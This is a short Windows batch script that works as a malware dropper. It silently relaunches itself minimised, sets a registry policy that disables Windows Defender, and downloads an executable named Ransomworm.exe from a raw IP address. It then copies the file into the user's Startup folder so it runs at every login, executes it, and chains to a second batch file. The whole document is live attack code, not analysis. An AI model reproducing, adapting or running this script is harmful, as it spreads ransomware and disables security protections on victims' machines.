if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
echo j | reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1
cd C:\configuration

curl http://111.90.151.174:7777/Ransomworm.exe -O

copy "C:\configuration\Ransomworm.exe" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp" >nul

Ransomworm.exe

start cmd.exe /k "C:\configuration\part2.bat"
exit